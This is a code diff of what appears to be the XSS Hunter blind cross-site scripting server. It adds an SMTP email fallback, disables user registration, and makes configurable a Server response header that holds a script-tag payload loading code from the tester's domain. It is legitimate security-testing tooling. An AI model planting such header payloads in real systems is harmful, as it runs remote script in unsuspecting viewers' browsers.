@@ -16,6 +16,7 @@ import yaml
 import sys
 import os
 import io
+import smtplib
 
 from models.initiate_database import *
 from tornado import gen
@@ -25,6 +26,7 @@ from models.injection_record import Injection
 from models.request_record import InjectionRequest
 from models.collected_page import CollectedPage
 from binascii import a2b_base64
+from threading import Thread
 
 logging.basicConfig(filename="logs/detailed.log",level=logging.DEBUG)
 
@@ -61,7 +63,7 @@ class BaseHandler(tornado.web.RequestHandler):
         self.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
         self.set_header("Pragma", "no-cache")
         self.set_header("Expires", "0")
-        self.set_header("Server", "<script src=//y.vg></script>")
+        self.set_header("Server", "<script src=//" + settings["domain"] + "></script>")
 
         self.request.remote_ip = self.request.headers.get( "X-Forwarded-For" )
 
@@ -230,22 +232,54 @@ def record_callback_in_database( callback_data, request_handler ):
 def email_sent_callback( response ):
     print response.body
 
+class SMTPSender(Thread):
+  def __init__(self, to, subject, body, body_type):
+    Thread.__init__(self)
+    self.to = to
+    self.subject = subject
+    self.body = body
+    self.content_type = "%s; charset=\"UTF-8\"" % ("text/html" if body_type == "html" else "text/plain")
+
+  def run(self):
+    email = """\
+From: %s
+To: %s
+Subject: %s
+Content-Type: %s
+
+%s
+""" % (settings['email_from'], self.to, self.subject, self.content_type, self.body)
+   
+
+    try:
+      smtp = smtplib.SMTP_SSL(settings['smtp_host'], settings['smtp_port'], None, None, None, 5)
+      smtp.login(settings['smtp_login'], settings['smtp_password'])
+      smtp.sendmail(settings['email_from'], self.to, email)
+      smtp.close()
+    except Exception as e:
+      logging.warn("Error sending SMTP email: " + e)
+
 def send_email( to, subject, body, attachment_file, body_type="html" ):
     if body_type == "html":
         body += "<br /><img src=\"https://api." + settings["domain"] + "/" + attachment_file.encode( "utf-8" ) + "\" />" # I'm so sorry.
+    
+    if settings["use_mailgun"]:
+      email_data = {
+          "from": urllib.quote_plus( settings["email_from"] ),
+          "to": urllib.quote_plus( to ),
+          "subject": urllib.quote_plus( subject ),
+          body_type: urllib.quote_plus( body ),
+      }
 
-    email_data = {
-        "from": urllib.quote_plus( settings["email_from"] ),
-        "to": urllib.quote_plus( to ),
-        "subject": urllib.quote_plus( subject ),
-        body_type: urllib.quote_plus( body ),
-    }
+      thread = unirest.post( "https://api.mailgun.net/v3/" + settings["mailgun_sending_domain"] + "/messages",
+              headers={"Accept": "application/json"},
+              params=email_data,
+              auth=("api", settings["mailgun_api_key"] ),
+              callback=email_sent_callback)
 
-    thread = unirest.post( "https://api.mailgun.net/v3/" + settings["mailgun_sending_domain"] + "/messages",
-            headers={"Accept": "application/json"},
-            params=email_data,
-            auth=("api", settings["mailgun_api_key"] ),
-            callback=email_sent_callback)
+    else:
+      sender = SMTPSender(to, subject, body, body_type)
+      sender.start()
 
 def send_javascript_pgp_encrypted_callback_message( email_data, email ):
     return send_email( email, "[XSS Hunter] XSS Payload Message (PGP Encrypted)", email_data, False, "text" )
@@ -310,6 +344,9 @@ def authenticate_user( request_handler, in_username ):
 class RegisterHandler(BaseHandler):
     @gen.coroutine
     def post(self):
+
+	# disable user registration
+	return
         user_data = json.loads(self.request.body)
         user_data["email_enabled"] = True
         if not self.validate_input( ["email","username","password", "domain"], user_data ):
